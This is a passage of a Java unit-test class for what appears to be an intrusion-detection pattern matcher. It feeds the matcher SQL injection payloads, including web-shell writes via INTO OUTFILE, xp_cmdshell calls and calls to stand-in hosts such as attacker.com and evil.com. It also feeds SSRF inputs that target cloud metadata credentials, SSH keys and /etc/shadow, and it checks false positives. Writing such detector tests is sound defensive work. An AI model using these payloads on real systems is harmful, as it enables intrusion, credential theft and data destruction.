    @Test public void sqli17_orStrEq() { assertMatch("/page?name=' OR 'a'='a", "url", "sqli_or_boolean", "or"); }
    @Test public void sqli18_and1eq1() { assertMatch("/item?id=5 AND 1=1--", "url", "sqli_or_boolean", "and"); }
    @Test public void sqli19_orTrue() { assertMatch("{\"search\":\"test' OR true--\"}", "body", "sqli_or_boolean", "or"); }
    @Test public void sqli20_andFalse() { assertMatch("{\"filter\":\"x' AND false--\"}", "body", "sqli_or_boolean", "and"); }
    @Test public void sqli21_or1eq1Hash() { assertMatch("/login?user=' OR 1=1#", "url", "sqli_or_boolean", "or"); }
    @Test public void sqli22_orQuotedEq() { assertMatch("admin' OR '1'='1'--", "body", "sqli_or_boolean", "or"); }
    @Test public void sqli23_andSubstring() { assertMatch("1' AND 1=1 AND 'a'='a", "body", "sqli_or_boolean", "and"); }
    @Test public void sqli24_or1eq1Limit() { assertMatch("' OR 1=1 LIMIT 1--", "body", "sqli_or_boolean", "or"); }
    @Test public void sqli25_headerCookieSqli() { assertMatch("{cookie=[session=abc; lang=en' OR 1=1--]}", "headers", "sqli_or_boolean", "or"); }
    @Test public void sqli26_headerRefererSqli() { assertMatch("{referer=[http://example.com/page?id=1' OR '1'='1]}", "headers", "sqli_or_boolean", "or"); }
    @Test public void sqli27_orTrueBody() { assertMatch("{\"username\":\"admin\",\"password\":\"x' OR true--\"}", "body", "sqli_or_boolean", "or"); }

    // =====================================================================
    //  SQL INJECTION — TIME-BASED BLIND (28-39)
    //  Expected pattern: sqli_time_based
    // =====================================================================

    @Test public void sqli28_waitforDelay() { assertMatch("'; WAITFOR DELAY '0:0:5'--", "body", "sqli_time_based", "waitfor"); }
    @Test public void sqli29_mysqlSleep() { assertMatch("/item?id=1' AND SLEEP(5)--", "url", "sqli_time_based", "sleep"); }
    @Test public void sqli30_pgSleep() { assertMatch("'; SELECT pg_sleep(5)--", "body", "sqli_time_based", "pg_sleep"); }
    @Test public void sqli31_benchmark() { assertMatch("' AND BENCHMARK(10000000,SHA1('test'))--", "body", "sqli_time_based", "benchmark"); }
    @Test public void sqli32_waitforDelayMssql() { assertMatch("1; WAITFOR DELAY '0:0:5'--", "body", "sqli_time_based", "waitfor"); }
    @Test public void sqli33_pgSleepCase() { assertMatch("'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--", "body", "sqli_time_based", "pg_sleep"); }
    @Test public void sqli34_waitforUrl() { assertMatch("/search?q=test'; WAITFOR DELAY '0:0:10'--", "url", "sqli_time_based", "waitfor"); }
    @Test public void sqli35_benchmarkVersion() { assertMatch("' AND BENCHMARK(5000000,MD5('sqli'))--", "body", "sqli_time_based", "benchmark"); }
    @Test public void sqli36_pgSleepUrl() { assertMatch("/api/data?id=1; SELECT pg_sleep(10)--", "url", "sqli_time_based", "pg_sleep"); }
    @Test public void sqli37_waitforHeader() { assertMatch("{cookie=[token=abc' WAITFOR DELAY '0:0:5'--]}", "headers", "sqli_time_based", "waitfor"); }
    @Test public void sqli38_pgSleepNum() { assertMatch("' OR pg_sleep(15)--", "body", "sqli_time_based", "pg_sleep"); }
    @Test public void sqli39_benchmarkLong() { assertMatch("' AND BENCHMARK(50000000,SHA1('a'))--", "body", "sqli_time_based", "benchmark"); }

    // =====================================================================
    //  SQL INJECTION — STACKED QUERIES (40-51)
    //  Expected pattern: sqli_stacked_queries
    // =====================================================================

    @Test public void sqli40_stackedDrop() { assertMatch("'; DROP TABLE users--", "body", "sqli_stacked_queries", "drop"); }
    @Test public void sqli41_stackedInsert() { assertMatch("'; INSERT INTO users(username,password) VALUES('hacker','pass123')--", "body", "sqli_stacked_queries", "insert"); }
    @Test public void sqli42_stackedUpdate() { assertMatch("'; UPDATE users SET password='hacked' WHERE username='admin'--", "body", "sqli_stacked_queries", "update"); }
    @Test public void sqli43_stackedDelete() { assertMatch("'; DELETE FROM logs WHERE 1=1--", "body", "sqli_stacked_queries", "delete"); }
    @Test public void sqli44_stackedSelect() { assertMatch("1; SELECT * FROM users--", "body", "sqli_stacked_queries", "select"); }
    @Test public void sqli45_stackedCreate() { assertMatch("'; CREATE TABLE exfil(data varchar(8000))--", "body", "sqli_stacked_queries", "create"); }
    @Test public void sqli46_stackedAlter() { assertMatch("'; ALTER TABLE users ADD COLUMN backdoor varchar(100)--", "body", "sqli_stacked_queries", "alter"); }
    @Test public void sqli47_stackedDropUrl() { assertMatch("/search?q=test'; DROP TABLE sessions--", "url", "sqli_stacked_queries", "drop"); }
    @Test public void sqli48_stackedInsertUrl() { assertMatch("/api?id=1; INSERT INTO audit(msg) VALUES('pwned')--", "url", "sqli_stacked_queries", "insert"); }
    @Test public void sqli49_stackedUpdateHeader() { assertMatch("{cookie=[lang=en; UPDATE users SET role='admin' WHERE id=1--]}", "headers", "sqli_stacked_queries", "update"); }
    @Test public void sqli50_stackedDeleteBody() { assertMatch("{\"input\":\"x'; DELETE FROM tokens WHERE 1=1--\"}", "body", "sqli_stacked_queries", "delete"); }
    @Test public void sqli51_stackedSelectBody() { assertMatch("{\"name\":\"a'; SELECT password FROM users WHERE username='admin'--\"}", "body", "sqli_stacked_queries", "select"); }

    // =====================================================================
    //  SQL INJECTION — EXEC / STORED PROCEDURES (52-58)
    //  Expected pattern: sqli_exec_execute
    // =====================================================================

    @Test public void sqli52_execXpCmdshell() { assertMatch("'; EXEC xp_cmdshell('whoami')--", "body", "sqli_exec_execute", "exec"); }
    @Test public void sqli53_execXpCmdshellNet() { assertMatch("'; EXEC xp_cmdshell('net user hacker P@ss /add')--", "body", "sqli_exec_execute", "exec"); }
    @Test public void sqli54_executeProc() { assertMatch("'; EXECUTE sp_configure('show advanced options',1)--", "body", "sqli_exec_execute", "execute"); }
    @Test public void sqli55_execDirtree() { assertMatch("'; EXEC master..xp_dirtree('\\\\attacker.com\\share')--", "body", "sqli_exec_execute", "exec"); }
    @Test public void sqli56_execUrl() { assertMatch("/api?cmd='; EXEC xp_cmdshell('dir')--", "url", "sqli_exec_execute", "exec"); }
    @Test public void sqli57_execRegread() { assertMatch("'; EXEC xp_regread('HKEY_LOCAL_MACHINE','SOFTWARE\\Microsoft')--", "body", "sqli_exec_execute", "exec"); }
    @Test public void sqli58_executeOpenrowset() { assertMatch("'; EXECUTE('SELECT * FROM OPENROWSET(''SQLOLEDB'',''server=evil.com'')')--", "body", "sqli_exec_execute", "execute"); }

    // =====================================================================
    //  SQL INJECTION — COMMENT EVASION (59-66)
    //  Expected pattern: sqli_comment_evasion
    // =====================================================================

    @Test public void sqli59_singleQuoteDash() { assertMatch("admin'--", "body", "sqli_comment_evasion", "'"); }
    @Test public void sqli60_quoteHash() { assertMatch("admin'#", "body", "sqli_comment_evasion", "'"); }
    @Test public void sqli61_cStyleComment() { assertMatch("' OR /*bypass*/ 1=1", "body", "sqli_comment_evasion", "/*"); }
    @Test public void sqli62_semicolonDash() { assertMatch("test;--", "body", "sqli_comment_evasion", ";"); }
    @Test public void sqli63_quoteDashUrl() { assertMatch("/login?user=admin'--", "url", "sqli_comment_evasion", "'"); }
    @Test public void sqli64_quoteHashUrl() { assertMatch("/auth?pass=x'#", "url", "sqli_comment_evasion", "'"); }
    @Test public void sqli65_cCommentWaf() { assertMatch("'/**/OR/**/1=1", "body", "sqli_comment_evasion", "/*"); }
    @Test public void sqli66_semicolonDashHeader() { assertMatch("{cookie=[id=5;-- ]}", "headers", "sqli_comment_evasion", ";"); }

    // =====================================================================
    //  SQL INJECTION — INTO OUTFILE / DUMPFILE (67-70)
    //  Expected pattern: sqli_into_outfile
    // =====================================================================

    @Test public void sqli67_intoOutfile() { assertMatch("' UNION SELECT 1,'<?php system($_GET[\"cmd\"]); ?>',3 INTO OUTFILE '/var/www/html/shell.php'--", "body", "sqli_into_outfile", "into outfile"); }
    @Test public void sqli68_intoDumpfile() { assertMatch("' UNION SELECT 1,2,3 INTO DUMPFILE '/tmp/data.txt'--", "body", "sqli_into_outfile", "into dumpfile"); }
    @Test public void sqli69_intoOutfileUrl() { assertMatch("/export?q=' UNION SELECT 1,2,3 INTO OUTFILE '/tmp/dump.csv'--", "url", "sqli_into_outfile", "into outfile"); }
    @Test public void sqli70_intoDumpfileBody() { assertMatch("{\"query\":\"' INTO DUMPFILE '/var/www/backdoor.php'--\"}", "body", "sqli_into_outfile", "into dumpfile"); }

    // =====================================================================
    //  SQL INJECTION — DROP TABLE (71-74)
    //  Expected pattern: sqli_drop_table
    // =====================================================================

    @Test public void sqli71_dropTable() { assertMatch("'; DROP TABLE users--", "body", "sqli_drop_table", "drop table"); }
    @Test public void sqli72_dropTableUrl() { assertMatch("/api?q=1; DROP TABLE sessions--", "url", "sqli_drop_table", "drop table"); }
    @Test public void sqli73_dropTableLogs() { assertMatch("{\"input\":\"x'; DROP TABLE audit_logs\"}", "body", "sqli_drop_table", "drop table"); }
    @Test public void sqli74_dropTableHeader() { assertMatch("{referer=[http://x.com/?id=1; DROP TABLE tokens--]}", "headers", "sqli_drop_table", "drop table"); }

    // =====================================================================
    //  SQL INJECTION — REALISTIC COMBINED PAYLOADS (75-90)
    //  Multi-technique payloads in realistic HTTP contexts
    // =====================================================================

    // Auth bypass in login form body
    @Test public void sqli75_authBypassOr() { assertMatch("{\"username\":\"admin' OR '1'='1\",\"password\":\"anything\"}", "body", "sqli_or_boolean", "or"); }
    // Union injection in search endpoint
    @Test public void sqli76_searchUnion() { assertMatch("/search?q=phones' UNION SELECT username,password,3 FROM users--", "url", "sqli_union_select", "union"); }
    // Time-based blind in cookie header
    @Test public void sqli77_cookieTimeBased() { assertMatch("{cookie=[user_pref=en'; WAITFOR DELAY '0:0:5'--]}", "headers", "sqli_time_based", "waitfor"); }
    // Stacked query privilege escalation
    @Test public void sqli78_stackedPrivEsc() { assertMatch("{\"comment\":\"nice'; UPDATE users SET role='admin' WHERE username='attacker'--\"}", "body", "sqli_stacked_queries", "update"); }
    // UNION with information_schema via URL
    @Test public void sqli79_unionInfoSchemaUrl() { assertMatch("/product?id=0 UNION SELECT 1,GROUP_CONCAT(column_name),3 FROM information_schema.columns--", "url", "sqli_union_select", "union"); }
    // Error-based with extractvalue (triggers comment evasion via /**/)
    @Test public void sqli80_errorExtractvalue() { assertMatch("' AND EXTRACTVALUE(1,CONCAT(0x7e,/**/version()/**/,0x7e))--", "body", "sqli_comment_evasion", "/*"); }
    // Exec xp_cmdshell in request body
    @Test public void sqli81_execCmdshellBody() { assertMatch("{\"data\":\"1'; EXEC xp_cmdshell('type c:\\\\inetpub\\\\wwwroot\\\\web.config')--\"}", "body", "sqli_exec_execute", "exec"); }
    // Boolean blind in referer header
    @Test public void sqli82_refererBoolBlind() { assertMatch("{referer=[http://site.com/page?id=1 AND 1=1--]}", "headers", "sqli_or_boolean", "and"); }
    // Auth bypass with comment
    @Test public void sqli83_authBypassDash() { assertMatch("{\"user\":\"admin'--\",\"pass\":\"x\"}", "body", "sqli_comment_evasion", "'"); }
    // Union-based outfile write
    @Test public void sqli84_unionOutfile() { assertMatch("' UNION SELECT '<?php eval($_POST[c]);?>' INTO OUTFILE '/var/www/s.php'--", "body", "sqli_into_outfile", "into outfile"); }
    // PostgreSQL sleep in URL
    @Test public void sqli85_pgSleepInUrl() { assertMatch("/api/v2/items?sort=name'; SELECT pg_sleep(10)--", "url", "sqli_time_based", "pg_sleep"); }
    // UNION from dual (Oracle-style)
    @Test public void sqli86_unionFromDual() { assertMatch("' UNION SELECT banner FROM v$version--", "body", "sqli_union_from", "union"); }
    // Benchmark in X-Forwarded-For header
    @Test public void sqli87_xffBenchmark() { assertMatch("{x-forwarded-for=[127.0.0.1' AND BENCHMARK(10000000,SHA1('x'))--]}", "headers", "sqli_time_based", "benchmark"); }
    // Stacked insert for data exfil
    @Test public void sqli88_stackedInsertExfil() { assertMatch("'; INSERT INTO log(data) SELECT CONCAT(username,':',password) FROM users--", "body", "sqli_stacked_queries", "insert"); }
    // Drop table in user-agent
    @Test public void sqli89_uaDropTable() { assertMatch("{user-agent=[Mozilla/5.0'; DROP TABLE analytics--]}", "headers", "sqli_drop_table", "drop table"); }
    // OR boolean blind with LIKE
    @Test public void sqli90_orBooleanLike() { assertMatch("/users?name=test' OR 'x'='x", "url", "sqli_or_boolean", "or"); }

    // =====================================================================
    //  SSRF — LOCALHOST / LOOPBACK (ssrf01–ssrf20)
    //  Expected pattern: ssrf_localhost
    // =====================================================================

    @Test public void ssrf01_localhostAdmin() { assertMatch("http://localhost/admin", "body", "ssrf_localhost", "http://localhost/"); }
    @Test public void ssrf02_localhost8080() { assertMatch("http://localhost:8080/api/internal", "body", "ssrf_localhost", "http://localhost:8080"); }
    @Test public void ssrf03_localhostSsh() { assertMatch("http://localhost:22/", "body", "ssrf_localhost", "http://localhost:22/"); }
    @Test public void ssrf04_localhostMysql() { assertMatch("http://localhost:3306/", "body", "ssrf_localhost", "http://localhost:3306"); }
    @Test public void ssrf05_localhostRedis() { assertMatch("http://localhost:6379/", "body", "ssrf_localhost", "http://localhost:6379"); }
    @Test public void ssrf06_localhostMongo() { assertMatch("http://localhost:27017/", "body", "ssrf_localhost", "http://localhost:27017"); }
    @Test public void ssrf07_localhostElastic() { assertMatch("http://localhost:9200/_cat/indices", "body", "ssrf_localhost", "http://localhost:9200"); }
    @Test public void ssrf08_localhostPostgres() { assertMatch("http://localhost:5432/", "body", "ssrf_localhost", "http://localhost:5432"); }
    @Test public void ssrf09_localhostMemcached() { assertMatch("http://localhost:11211/stats", "body", "ssrf_localhost", "http://localhost:11211"); }
    @Test public void ssrf10_httpsLocalhost() { assertMatch("https://localhost/server-status", "body", "ssrf_localhost", "https://localhost/"); }
    @Test public void ssrf11_127Admin() { assertMatch("http://127.0.0.1/admin", "body", "ssrf_localhost", "http://127.0.0.1/"); }
    @Test public void ssrf12_1278080() { assertMatch("http://127.0.0.1:8080/", "body", "ssrf_localhost", "http://127.0.0.1:8080"); }
    @Test public void ssrf13_127Prometheus() { assertMatch("http://127.0.0.1:9090/metrics", "body", "ssrf_localhost", "http://127.0.0.1:9090"); }
    @Test public void ssrf14_127DockerApi() { assertMatch("http://127.0.0.1:2375/containers/json", "body", "ssrf_localhost", "http://127.0.0.1:2375"); }
    @Test public void ssrf15_127DockerTls() { assertMatch("http://127.0.0.1:2376/info", "body", "ssrf_localhost", "http://127.0.0.1:2376"); }
    @Test public void ssrf16_https127() { assertMatch("https://127.0.0.1:443/", "body", "ssrf_localhost", "https://127.0.0.1:443"); }
    @Test public void ssrf17_zeroIp() { assertMatch("http://0.0.0.0/", "body", "ssrf_localhost", "http://0.0.0.0/"); }
    @Test public void ssrf18_zeroIp8080() { assertMatch("http://0.0.0.0:8080/", "body", "ssrf_localhost", "http://0.0.0.0:8080"); }
    @Test public void ssrf19_127Glassfish() { assertMatch("http://127.0.0.1:4848/asadmin", "body", "ssrf_localhost", "http://127.0.0.1:4848"); }
    @Test public void ssrf20_localhostConsul() { assertMatch("http://localhost:8500/v1/agent/self", "body", "ssrf_localhost", "http://localhost:8500"); }

    // =====================================================================
    //  SSRF — PRIVATE IP RANGES (ssrf21–ssrf42)
    //  Expected pattern: ssrf_private_ip
    // =====================================================================

    @Test public void ssrf21_10net() { assertMatch("http://10.0.0.1/", "body", "ssrf_private_ip", "http://10.0.0.1/"); }
    @Test public void ssrf22_10net8080() { assertMatch("http://10.0.0.1:8080/admin", "body", "ssrf_private_ip", "http://10.0.0.1:8080"); }
    @Test public void ssrf23_10repeat() { assertMatch("http://10.10.10.10/", "body", "ssrf_private_ip", "http://10.10.10.10"); }
    @Test public void ssrf24_10high() { assertMatch("http://10.255.255.1/", "body", "ssrf_private_ip", "http://10.255.255.1"); }
    @Test public void ssrf25_10elastic() { assertMatch("http://10.0.0.1:9200/_cluster/health", "body", "ssrf_private_ip", "http://10.0.0.1:9200"); }
    @Test public void ssrf26_10redis() { assertMatch("http://10.0.0.1:6379/", "body", "ssrf_private_ip", "http://10.0.0.1:6379"); }
    @Test public void ssrf27_10docker() { assertMatch("http://10.0.0.1:2375/containers/json", "body", "ssrf_private_ip", "http://10.0.0.1:2375"); }
    @Test public void ssrf28_172_16() { assertMatch("http://172.16.0.1/", "body", "ssrf_private_ip", "http://172.16.0.1/"); }
    @Test public void ssrf29_172_16mgmt() { assertMatch("http://172.16.0.1:8443/management", "body", "ssrf_private_ip", "http://172.16.0.1:8443"); }
    @Test public void ssrf30_172_17docker() { assertMatch("http://172.17.0.1/", "body", "ssrf_private_ip", "http://172.17.0.1/"); }
    @Test public void ssrf31_172_17container() { assertMatch("http://172.17.0.2:8080/", "body", "ssrf_private_ip", "http://172.17.0.2:8080"); }
    @Test public void ssrf32_172_20() { assertMatch("http://172.20.0.1/", "body", "ssrf_private_ip", "http://172.20.0.1/"); }
    @Test public void ssrf33_172_31max() { assertMatch("http://172.31.255.255/", "body", "ssrf_private_ip", "http://172.31.255.255"); }
    @Test public void ssrf34_172_25grafana() { assertMatch("http://172.25.0.1:3000/", "body", "ssrf_private_ip", "http://172.25.0.1:3000"); }
    @Test public void ssrf35_192_168base() { assertMatch("http://192.168.0.1/", "body", "ssrf_private_ip", "http://192.168.0.1/"); }
    @Test public void ssrf36_192_168admin() { assertMatch("http://192.168.1.1/admin", "body", "ssrf_private_ip", "http://192.168.1.1/"); }
    @Test public void ssrf37_192_168_8080() { assertMatch("http://192.168.1.1:8080/", "body", "ssrf_private_ip", "http://192.168.1.1:8080"); }
    @Test public void ssrf38_192_168prom() { assertMatch("http://192.168.0.1:9090/", "body", "ssrf_private_ip", "http://192.168.0.1:9090"); }
    @Test public void ssrf39_192_168grafana() { assertMatch("http://192.168.1.100:3000/grafana", "body", "ssrf_private_ip", "http://192.168.1.100:3000"); }
    @Test public void ssrf40_192_168_10() { assertMatch("http://192.168.10.1/", "body", "ssrf_private_ip", "http://192.168.10.1/"); }
    @Test public void ssrf41_https192() { assertMatch("https://192.168.1.1:443/", "body", "ssrf_private_ip", "https://192.168.1.1:443"); }
    @Test public void ssrf42_192max() { assertMatch("http://192.168.255.255/", "body", "ssrf_private_ip", "http://192.168.255.255"); }

    // =====================================================================
    //  SSRF — CLOUD METADATA ENDPOINTS (ssrf43–ssrf58)
    //  Expected pattern: ssrf_metadata
    // =====================================================================

    @Test public void ssrf43_awsMetaBase() { assertMatch("http://169.254.169.254/latest/meta-data/", "body", "ssrf_metadata", "http://169.254.169.254"); }
    @Test public void ssrf44_awsIamCreds() { assertMatch("http://169.254.169.254/latest/meta-data/iam/security-credentials/", "body", "ssrf_metadata", "http://169.254.169.254"); }
    @Test public void ssrf45_awsHostname() { assertMatch("http://169.254.169.254/latest/meta-data/hostname", "body", "ssrf_metadata", "http://169.254.169.254"); }
    @Test public void ssrf46_awsUserData() { assertMatch("http://169.254.169.254/latest/user-data", "body", "ssrf_metadata", "http://169.254.169.254"); }
    @Test public void ssrf47_awsIamRole() { assertMatch("http://169.254.169.254/latest/meta-data/iam/security-credentials/admin-role", "body", "ssrf_metadata", "http://169.254.169.254"); }
    @Test public void ssrf48_awsEc2Creds() { assertMatch("http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance", "body", "ssrf_metadata", "http://169.254.169.254"); }
    @Test public void ssrf49_awsImdsV2Token() { assertMatch("http://169.254.169.254/latest/api/token", "body", "ssrf_metadata", "http://169.254.169.254"); }
    @Test public void ssrf50_awsInstanceDoc() { assertMatch("http://169.254.169.254/latest/dynamic/instance-identity/document", "body", "ssrf_metadata", "http://169.254.169.254"); }
    @Test public void ssrf51_azureInstance() { assertMatch("http://169.254.169.254/metadata/instance?api-version=2021-02-01", "body", "ssrf_metadata", "http://169.254.169.254"); }
    @Test public void ssrf52_azureOauth() { assertMatch("http://169.254.169.254/metadata/identity/oauth2/token", "body", "ssrf_metadata", "http://169.254.169.254"); }
    @Test public void ssrf53_oracleOpc() { assertMatch("http://169.254.169.254/opc/v1/instance/", "body", "ssrf_metadata", "http://169.254.169.254"); }
    @Test public void ssrf54_digitalOcean() { assertMatch("http://169.254.169.254/v1/", "body", "ssrf_metadata", "http://169.254.169.254"); }
    @Test public void ssrf55_gcpMetaBase() { assertMatch("http://metadata.google.internal/computeMetadata/v1/", "body", "ssrf_metadata", "http://metadata.google.internal"); }
    @Test public void ssrf56_gcpSaToken() { assertMatch("http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token", "body", "ssrf_metadata", "http://metadata.google.internal"); }
    @Test public void ssrf57_gcpProjectId() { assertMatch("http://metadata.google.internal/computeMetadata/v1/project/project-id", "body", "ssrf_metadata", "http://metadata.google.internal"); }
    @Test public void ssrf58_gcpKubeEnv() { assertMatch("http://metadata.google.internal/computeMetadata/v1/instance/attributes/kube-env", "body", "ssrf_metadata", "http://metadata.google.internal"); }

    // =====================================================================
    //  SSRF — ALTERNATIVE PROTOCOLS (ssrf59–ssrf80)
    //  Expected pattern: ssrf_file_protocol
    // =====================================================================

    @Test public void ssrf59_filePasswd() { assertMatch("file:///etc/passwd", "body", "ssrf_file_protocol", "file://"); }
    @Test public void ssrf60_fileShadow() { assertMatch("file:///etc/shadow", "body", "ssrf_file_protocol", "file://"); }
    @Test public void ssrf61_fileHosts() { assertMatch("file:///etc/hosts", "body", "ssrf_file_protocol", "file://"); }
    @Test public void ssrf62_fileProcEnv() { assertMatch("file:///proc/self/environ", "body", "ssrf_file_protocol", "file://"); }
    @Test public void ssrf63_fileProcCmd() { assertMatch("file:///proc/self/cmdline", "body", "ssrf_file_protocol", "file://"); }
    @Test public void ssrf64_fileProcNet() { assertMatch("file:///proc/net/tcp", "body", "ssrf_file_protocol", "file://"); }
    @Test public void ssrf65_fileProcFd() { assertMatch("file:///proc/self/fd/0", "body", "ssrf_file_protocol", "file://"); }
    @Test public void ssrf66_fileNginxConf() { assertMatch("file:///etc/nginx/nginx.conf", "body", "ssrf_file_protocol", "file://"); }
    @Test public void ssrf67_fileApacheLog() { assertMatch("file:///var/log/apache2/access.log", "body", "ssrf_file_protocol", "file://"); }
    @Test public void ssrf68_fileSshKey() { assertMatch("file:///home/user/.ssh/id_rsa", "body", "ssrf_file_protocol", "file://"); }
    @Test public void ssrf69_fileAwsCreds() { assertMatch("file:///home/user/.aws/credentials", "body", "ssrf_file_protocol", "file://"); }
    @Test public void ssrf70_fileWinIni() { assertMatch("file://c:/windows/win.ini", "body", "ssrf_file_protocol", "file://"); }
    @Test public void ssrf71_gopherRedis() { assertMatch("gopher://127.0.0.1:6379/_SET%20pwned%20true", "body", "ssrf_file_protocol", "gopher://"); }
    @Test public void ssrf72_gopherSmtp() { assertMatch("gopher://127.0.0.1:25/_MAIL%20FROM:<attacker@evil.com>", "body", "ssrf_file_protocol", "gopher://"); }
    @Test public void ssrf73_gopherMysql() { assertMatch("gopher://127.0.0.1:3306/_%01%00%00%01%85%a2%03", "body", "ssrf_file_protocol", "gopher://"); }
    @Test public void ssrf74_gopherMemcached() { assertMatch("gopher://127.0.0.1:11211/_stats%0d%0a", "body", "ssrf_file_protocol", "gopher://"); }
    @Test public void ssrf75_gopherFastcgi() { assertMatch("gopher://127.0.0.1:9000/_%01%01%00%01%00%08%00%00", "body", "ssrf_file_protocol", "gopher://"); }
    @Test public void ssrf76_dictRedis() { assertMatch("dict://127.0.0.1:6379/INFO", "body", "ssrf_file_protocol", "dict://"); }
    @Test public void ssrf77_dictMemcached() { assertMatch("dict://127.0.0.1:11211/stats", "body", "ssrf_file_protocol", "dict://"); }
    @Test public void ssrf78_dictRedisConfig() { assertMatch("dict://127.0.0.1:6379/CONFIG%20SET%20dir%20/tmp", "body", "ssrf_file_protocol", "dict://"); }
    @Test public void ssrf79_tftpEvil() { assertMatch("tftp://evil.com/shell.php", "body", "ssrf_file_protocol", "tftp://"); }
    @Test public void ssrf80_tftpInternal() { assertMatch("tftp://10.0.0.1/config.txt", "body", "ssrf_file_protocol", "tftp://"); }

    // =====================================================================
    //  SSRF — PORT SCANNING (ssrf81–ssrf84)
    //  Expected pattern: ssrf_localhost (targeting internal service ports)
    // =====================================================================

    @Test public void ssrf81_127Jupyter() { assertMatch("http://127.0.0.1:8888/", "body", "ssrf_localhost", "http://127.0.0.1:8888"); }
    @Test public void ssrf82_127K8sApi() { assertMatch("http://127.0.0.1:6443/", "body", "ssrf_localhost", "http://127.0.0.1:6443"); }
    @Test public void ssrf83_127Kubelet() { assertMatch("http://127.0.0.1:10250/pods", "body", "ssrf_localhost", "http://127.0.0.1:10250"); }
    @Test public void ssrf84_127KubeletRo() { assertMatch("http://127.0.0.1:10255/pods", "body", "ssrf_localhost", "http://127.0.0.1:10255"); }

    // =====================================================================
    //  SSRF — EMBEDDED IN REALISTIC CONTEXTS (ssrf85–ssrf96)
    //  Payloads inside JSON bodies, headers, and URL params
    // =====================================================================

    @Test public void ssrf85_jsonUrl() { assertMatch("{\"url\":\"http://localhost:8080/admin\"}", "body", "ssrf_localhost", "http://localhost:8080"); }
    @Test public void ssrf86_jsonWebhook() { assertMatch("{\"webhook\":\"http://169.254.169.254/latest/meta-data/\"}", "body", "ssrf_metadata", "http://169.254.169.254"); }
    @Test public void ssrf87_jsonCallback() { assertMatch("{\"callback\":\"http://10.0.0.1:9200/_search\"}", "body", "ssrf_private_ip", "http://10.0.0.1:9200"); }
    @Test public void ssrf88_jsonImageUrl() { assertMatch("{\"image_url\":\"file:///etc/passwd\"}", "body", "ssrf_file_protocol", "file://"); }
    @Test public void ssrf89_jsonProxy() { assertMatch("{\"proxy\":\"http://192.168.1.1:3128/\"}", "body", "ssrf_private_ip", "http://192.168.1.1:3128"); }
    @Test public void ssrf90_jsonEndpoint() { assertMatch("{\"endpoint\":\"http://metadata.google.internal/computeMetadata/v1/instance/hostname\"}", "body", "ssrf_metadata", "http://metadata.google.internal"); }
    @Test public void ssrf91_urlParam() { assertMatch("/fetch?url=http://127.0.0.1:8080/secret", "url", "ssrf_localhost", "http://127.0.0.1:8080"); }
    @Test public void ssrf92_urlParamPrivate() { assertMatch("/proxy?target=http://10.0.0.50:8080/internal/api", "url", "ssrf_private_ip", "http://10.0.0.50:8080"); }
    @Test public void ssrf93_urlParamMeta() { assertMatch("/load?src=http://169.254.169.254/latest/meta-data/", "url", "ssrf_metadata", "http://169.254.169.254"); }
    @Test public void ssrf94_headerReferer() { assertMatch("{referer=[http://localhost:3000/admin/dashboard]}", "headers", "ssrf_localhost", "http://localhost:3000"); }
    @Test public void ssrf95_headerOrigin() { assertMatch("{origin=[http://192.168.1.50:8080]}", "headers", "ssrf_private_ip", "http://192.168.1.50:8080"); }
    @Test public void ssrf96_jsonArrayUrls() { assertMatch("{\"urls\":[\"http://10.0.0.1:8080\",\"http://172.16.0.5:9200\"]}", "body", "ssrf_private_ip", "http://10.0.0.1:8080"); }

    // =====================================================================
    //  SSRF — FALSE POSITIVES
    //  Benign inputs that should NOT trigger SSRF detection
    // =====================================================================

    @Test
    public void fp_ssrf_benignTraffic() {
        // External URLs should not match localhost/private patterns
        assertEmpty(matcher.scan(
            "{\"url\":\"https://api.example.com/v1/data\"}",
            "body"), "external HTTPS URL");

        assertEmpty(matcher.scan(
            "{\"webhook\":\"https://hooks.slack.com/services/T00/B00/xxxx\"}",
            "body"), "Slack webhook URL");

        assertEmpty(matcher.scan(
            "/api/v2/fetch?url=https://cdn.example.com/images/logo.png",
            "url"), "external CDN URL");

        // localhost in Host header without http:// should not trigger
        assertNoCategory(matcher.scan(
            "{host=[localhost:8080], accept=[application/json]}",
            "headers"), "ssrf", "bare localhost in Host header");

        // IP-like version numbers
        assertEmpty(matcher.scan(
            "{\"version\":\"10.0.0.1\",\"build\":\"172.16.0\"}",
            "body"), "version numbers that look like IPs");

        // Public IPs should not match private ranges
        assertEmpty(matcher.scan(
            "{\"server\":\"http://8.8.8.8/dns-query\"}",
            "body"), "Google public DNS");

        assertEmpty(matcher.scan(
            "{\"api\":\"http://54.231.0.1/endpoint\"}",
            "body"), "AWS public IP");

        // file:// should not trigger in response body (patterns are request-only)
        assertEmpty(matcher.scan(
            "file:///etc/passwd", "resp_body"), "file:// in response body");

        // Normal headers with no SSRF
        assertEmpty(matcher.scan(
            "{host=[app.example.com], x-forwarded-for=[86.42.170.99], referer=[https://www.google.com/]}",
            "headers"), "normal request headers");

        // 172.x IPs outside private range (172.32+) should not match
        assertEmpty(matcher.scan(
            "http://172.32.0.1/", "body"), "172.32 is not private range");

        assertEmpty(matcher.scan(
            "http://172.15.0.1/", "body"), "172.15 is not private range");
    }

    // =====================================================================
    //  SQL INJECTION — FALSE POSITIVES
    //  Benign inputs that contain SQL-like words but shouldn't trigger
    // =====================================================================

    @Test
    public void fp_sqli_benignTraffic() {
        // Normal SQL keywords as JSON field values (not injected)
        assertEmpty(matcher.scan(
            "{\"action\":\"select\",\"table_name\":\"accounts\",\"drop_down\":\"category\",\"union_id\":\"U12345\"}",
            "body"), "benign JSON with SQL-like field names");

        // Normal ORDER BY in a legitimate API request
        assertEmpty(matcher.scan(
            "/api/products?sort=price&order=desc&limit=20&offset=0",
            "url"), "benign sort/order params");

        // SQL keywords appearing in prose/content
        assertEmpty(matcher.scan(
            "{\"comment\":\"Please select the right table and drop me a message when done.\"}",
            "body"), "SQL keywords in natural language");

        // Semicolons in normal URL params (not followed by SQL keywords)
        assertEmpty(matcher.scan(
            "/api/config?features=dark_mode;beta_ui;new_search",
            "url"), "semicolons in feature flags");

        // Normal cookie header
        assertEmpty(matcher.scan(
            "{cookie=[session=eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0; theme=dark; lang=en-US]}",
            "headers"), "benign cookie header");

        // Benign exec in JSON (not a SQL function call)
        assertEmpty(matcher.scan(
            "{\"exec_mode\":\"parallel\",\"execution_time\":\"2024-01-15T10:30:00Z\"}",
